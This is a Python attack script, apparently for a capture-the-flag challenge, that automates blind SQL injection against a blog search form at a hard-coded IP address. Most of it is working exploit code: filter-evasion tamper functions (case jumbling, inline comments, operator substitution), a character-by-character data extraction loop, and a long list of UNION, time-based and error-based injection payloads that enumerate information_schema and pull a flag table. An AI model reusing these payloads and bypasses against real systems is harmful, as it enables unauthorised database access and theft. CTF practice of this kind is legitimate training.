import requests
import lxml.html as parser
import string
session=requests.Session()
filtered=['--',' ','!','/','-']

def replacefiltered(payload,replacechar):
	global filtered
	final=""
	for letter in payload:
		if (letter.lower() in filtered):
			final+=replacechar
		else:
			final+=letter
	final=final.lower()
	final=final.replace("select","SeLeCt")
	return final

def space2hash(payload):
	final=""
	for letter in payload:
		if letter.lower() == ' ':
			final+="#"
		else:
			final+=letter
	return final

def space2concat(payload):
	final=""
	for letter in payload:
		if letter.lower() == ' ':
			final+="||"
		else:
			final+=letter
	return final

def space2dash(payload):
	final=""
	for letter in payload:
		if letter.lower() == ' ':
			final+="--"
		else:
			final+=letter
	return final

def space2comment(payload):
	final=""
	for letter in payload:
		if letter.lower() == ' ':
			final+="/**/"
		else:
			final+=letter
	return final

def blockedcomment(payload):
	global filtered
	payload=payload.lower()
	if '-' not in filtered:
		final=payload.replace("/*","--")
	elif '#' not in filtered and '##' not in payload:
		final=payload.replace("/*","##")
	elif '#' not in filtered and '##' in payload:
		final=payload.replace("/*"," ")
	else:
		final=payload.replace("/*","##")
	return final

def blockeddash(payload):
	final=""
	final=payload.replace('--','/*')
	return final

def blockedequals(payload):
	final=""
	for letter in payload:
		if letter.lower() == '=':
			final+=" like "
		else:
			final+=letter
	return final

def blockedor(payload):
	global filtered
	final=payload.lower()
	if '|' not in filtered:
		final=payload.replace("or","||")
	else:
		final=payload.replace("or ","like")
	return final


def blockedand(payload):
	global filtered
	final=payload.lower()
	if '|' not in filtered:
		final=payload.replace("and","&&")
	else:
		final=payload.replace("and","&&")
	return final


def jumbleletters(payload):
	final=""
	for letter in payload:
		if (payload.index(letter)%2 == 0):
			final+=letter.upper()
		else:
			final+=letter.lower()
	return final


def commentsmix(payload):
	final=""
	for letter in payload:
		if (payload.index(letter)%3 == 0) and (payload.index(letter) != 0):
			final+=f'/**/{letter}'
		else:
			final+=letter.lower()
	return final

def checkfilteredchar(payload):
	print(payload)
	global filtered
	for item in filtered:
		if item.lower() in payload.lower():
			return (f'\n[+]	FILTERED CHARACTER IN PAYLOAD :{item.encode()}')
		else:
			pass
	return ('[+]	PAYLOAD IS GOOD TO GO')

#challenge name : Wierd blog
host="http://34.76.107.218"
path="/weirdblog/index.php"
url=host+path
success="Owels Laugh On Youu"

def counter(param):
	# payload="'&&length(schema())>1#"
	correct=""
	run=1
	counter=0
	limit=25
	while (run ==1) and counter < limit:
		i=counter
		payload=f"'&&length({param})={str(i)}#"
		payload=jumbleletters(payload)
		print(f'[+] Trying payload {payload} correct={correct}')
		send={"search":payload}
		response=session.post(url,data=send)
		content=response.text
		headers=response.headers

		if success.lower() in content.lower():
			root=parser.fromstring(content)
			flag=root.xpath('//p[@class="lead"]/text()')
			print(f'{"".join(flag)}[SUCCESS] : {payload}')
			correct+=(str(i))
			run=0
		elif ('hack detected' in content.lower()):
			pass
			print(f'\t[CAUGHT] : {payload}')
			run=0
		else:
			pass
			# print(f'[FAILED] : {payload}')
		counter+=1
	if (int(counter) == limit):
		return 0
	else:
		return int(counter-1)

# counter()




def getvalue(param,length):
	lowercase='aeriowtnslcudphmnpgbfykvxzjq'
	letters=f"{lowercase}{lowercase.upper()}_012345,6.789#$%&'()*+:;<=>?@[]^|~"
	# startletter='a'
	print(f'\n\nUSING LETTERS : {letters}\n\n')
	# index=letters.index(startletter)
	run=1
	current=1
	index=0
	correct=''
	while (index < len(letters)) and (len(correct) < length) and (run==1):
		letter=correct+letters[index]
		payload=f"'&&(substring(({param}),1,{current})='{letter}')#"
		payload=(payload)
		print(f'[+] Trying payload {payload} correct : {correct} index: {index}')
		send={"search":payload}
		response=session.post(url,data=send)
		content=response.text
		headers=response.headers

		if success.lower() in content.lower():
			correct=letter
			print(f'\t[*]Added letter:{letter} to correct : {correct}')
			root=parser.fromstring(content)
			flag=root.xpath('//p[@class="lead"]/text()')
			print(f'{"".join(flag)}[SUCCESS] : {payload}')
			current+=1
			index=0
			# letter=correct+letters[index]
		elif ('hack detected' not in content.lower() and (success.lower() not in content.lower())):
			index+=1
		elif ('hack detected' in content.lower()):
			print(f'\t[CAUGHT] : {payload.encode()}')
			print(content)
			run=0
			

def tochar(payload):
	final="CHAR("
	for letter in payload:
		final+=str(ord(letter))+','
	final=final[0:-1]+")"
	return final

def space2char(payload):
	final=""
	for letter in payload:
		if letter.lower() == ' ':
			final+=tochar(letter)
		else:
			final+=letter
	return final

def replacespace(payload,replacement):
	final=""
	for letter in payload:
		if letter.lower() ==' ':
			final+=replacement
		else:
			final+=letter
	return final



def checker(payload):
	for item in string.printable:
		payload=f"'&&(SuBSTrInG((dATABASE()),1,10)='WeIrd_blox'){item}or{item}1=1#"
		print(f'[+] [{item}]  Trying payload {payload}')
		send={"search":payload}
		response=session.post(url,data=send)
		content=response.text
		headers=response.headers

		if success.lower() in content.lower():
			root=parser.fromstring(content)
			flag=root.xpath('//p[@class="lead"]/text()')
			print(f'{"".join(flag)}[SUCCESS] : {payload}')

		elif ('hack detected' not in content.lower() and (success.lower() not in content.lower())):
			pass
		elif ('hack detected' in content.lower()):
			pass
			# print(f'\t[CAUGHT] : {payload.encode()}')




#schema=10 weird_blog
# user=14 root@localhost

# print(space2char("' or 1=1"))

# print(tochar("current_user"))
param=('WeIrd_blog.blogs')
param=jumbleletters(param)
# getvalue(param,counter(param))
getvalue(param,counter(param))


#'&&(substring(CoNCAt(dAtAbAsE()),1,10)='weird_blog')#
# payload="'&&(substring(CoNCAt(dAtAbAsE()),1,10)='weird_blog')||select[schema_name]from[information_schema.schemata]#"
# print(space2char(jumbleletters(payload)))


# select[schema_name]from[information_schema.schemata]

# pay=jumbleletters("'&&(SuBSTrInG(CoNCAT(dATABASE()),1,10)='WeIrd_blox')||select(1)from(information_schema.columns)#")
# print(pay)

# payload="'&&1=2||make_set(6,@:=0x0a,(sElEct(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)#"
# print(jumbleletters(payload))
# print(checkfilteredchar(payload))


# '&&1=3||sELecT(400)#
# '&&1=3||sELecT(1,2,3,4,5,6,7)#
# '&&1=3||(SuBSTrInG(CoNCAT(dATABASE()),1,10)='WeIrd_blog')#




# ?id=1 AND extractvalue(rand(),concat(0x3a,(SElecT concat(CHAR(126),schema_name,CHAR(126)))))#



"""

select blogname from blogs where blogname='		'&&1=3||sleep(400)#		'
select blogname from blogs where blogname='		'&&1=3||like("%a%")&&sleep(400)#		'
select blogname from blogs where blogname='		'&&1=3||length(@@version)&&sleep(400)#		'
select blogname from blogs where blogname='		'&&1=3||1=1#		'
select blogname from blogs where blogname='		'&&1=3||lower("xxx")&&sleep(400)#		'
'&&1=3||like"%a%"&&sleep(400)#
"""
# '&&1=3||select(CHAR(76,34,56,45))#
# asd'||(sElect(`FL@g`)from(`FL@g`))#
# '&&1=1uNion(sElect(`FL@g`)from(`FL@g`))#

# qqq'uNion(sElect(`FL@g`)from(`FL@g`))#
# qqq'uNion(sElect((database())))#
# qqq'uNion(sElect(database())from(`InFoRMAtiON_sCHeMa`.`ColUMNs`))#
# qqq'uNion(sElect(`sCHeMa_NAmE`)from(`InFoRMAtiON_sCHeMa`.`sCHeMaTa`))#
# qqq'uNion(sElect(group_concat(`sCHeMa_NAmE`))from(`InFoRMAtiON_sCHeMa`.`sCHeMaTa`))#
# qqq'uNion(sElect(group_concat(`TaBlE_NAmE`))from(`InFoRMAtiON_sCHeMa`.`TaBles`))#
# qqq'uNion(sElect(group_concat(`TaBlE_NAmE`))from(`InFoRMAtiON_sCHeMa`.`TaBles`)&&(`TAblE_sCHemA`=database()))#
# qqq'uNion(sElect(group_concat(`sCHeMa_Name`))from(`InFoRMAtiON_sCHeMa`.`schemaTA`)HAving("weird_blog"="weird_blog"))#
# qqq'uNion(sElect(group_concat(`TAblE_sCHemA`))from(`InFoRMAtiON_sCHeMa`.`TaBles`)HAving(`sCHeMa_NAmE`))#
# qqq'uNion(sElect(`TaBLe_Name`)from(`InFoRMAtiON_sCHeMa`.`TAblEs`))#
# qqq'uNion(sElect(`TaBLe_Name`)from(`InFoRMAtiON_sCHeMa`.`TAblEs`)haVING(("allan")like('%a%')))#
# qqq'uNion(sElect(`TaBLe_Name`)from(`InFoRMAtiON_sCHeMa`.`TAblEs`)having(`TAblE_sCHemA`=DatAbAsE()))#
# SELECT (CustomerID AS ID, CustomerName AS Customer) FROM Customers; 
# from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE)
# qqq'uNion(sElect(tabLe_name)from(infOrmation_schema.tables)having((taBle_Name)>('CHARACTER_SETS')))#
# qqq'uNion(sElect(tabLe_name)from(infOrmation_schema.tables)having(length(taBle_Name)<9))#
# qqq'uNion(sElect(tabLe_name)from(infOrmation_schema.tables)having((taBle_Name)like('%fl%')))#
# qqq'uNion(sElect(tabLe_name)from(infOrmation_schema.tables)having(((taBle_Name)like('%fl%'))&&(length(taBle_Name)<10)))#
# qqq'uNion(sElect(ScHeMa_name)from(infOrmation_schema.ScHeMata)having(((ScHeMa_Name)like('%weird_blog%'))))#
# qqq'uNion(sElect(tabLe_name)from(infOrmation_schema.tables)having(((taBle_Name)like('%fl@%'))))#
# qqq'uNion(sElect(COluMn_name)from(infOrmation_schema.COluMns)having(((taBle_Name)like('%fl@%'))))#
# qqq'uNion(sElect(COluMn_name)from(infOrmation_schema.COluMns)having(((taBle_Name)like('%fl@%'))))#
# qqq'uNion(sElect(taBLe_name)from(infOrmation_schema.taBLes)having(((tAbLe_nAme)like('%fl@%'))))#
# qqq'uNion(sElect(colUMn_name)from(infOrmation_schema.colUMns)having(((colUMn_nAme)like('%fl@%'))))#
# qqq'uNion(sElect((`TaBlE_NAmE`))from(`InFoRMAtiON_sCHeMa`.`TaBles`)having(((`TaBlE_NAmE`)like('%fl@%'))))#
# qqq'uNion(sElect(`FL@g`)from(`FL@g`))#



qqq'uNion(sElect(group_concat(`FL@g`))from(`weird_blog.FL@g`))#
qqq'uNion(sElect(group_concat(`FL@g`))from(`weird_blog.FL@g`))#

